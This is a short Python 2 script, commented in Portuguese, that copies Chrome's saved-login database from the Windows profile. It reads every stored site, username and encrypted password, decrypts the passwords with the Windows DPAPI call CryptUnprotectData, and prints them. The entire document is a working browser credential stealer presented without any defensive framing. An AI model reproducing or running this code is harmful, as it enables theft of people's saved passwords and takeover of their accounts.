import os, sqlite3, shutil, win32crypt #1

banco = os.getenv("LOCALAPPDATA") + \
"\\Google\\Chrome\\User Data\\Default\\Login Data" #2

banco2 = banco + "2" #3
shutil.copyfile(banco, banco2)#4

conexao = sqlite3.connect(banco2) #5
consulta = conexao.cursor()
consulta.execute("SELECT action_url, username_value, password_value FROM logins") #6

for site,login,senha in consulta.fetchall(): #7
    print site + "\n" + login
    senha = win32crypt.CryptUnprotectData(senha) #8
    print senha[1].decode("ISO-8859-1") + "\n"

conexao.close() #9
os.remove(banco2) #10
